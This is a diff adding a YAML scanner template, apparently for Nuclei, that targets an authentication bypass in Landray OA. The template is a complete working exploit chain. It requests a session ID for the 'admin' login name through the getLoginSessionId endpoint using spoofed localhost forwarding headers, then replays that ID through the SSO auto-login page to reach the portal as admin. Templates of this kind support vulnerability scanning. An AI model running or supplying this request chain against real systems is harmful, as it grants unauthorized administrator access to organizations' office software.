@@ -1,0 +1,48 @@
+id: landray-oa-getloginsessionid-auth-bypass
+
+info:
+  name: 蓝凌OA getLoginSessionId 认证绕过
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api///sys-authentication/loginService/getLoginSessionId HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        loginName=admin
+
+      - |
+        GET /sys/authentication/sso/login_auto.jsp?sessionId={{sessionID}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /sys/portal/page.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: sessionID
+        internal: true
+        json:
+          - .sessionId
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_1==200 && contains(body_1,"sessionId")
+          - status_code_2==302
+          - status_code_3==200 && contains(body_3,"SessionExpireTip")
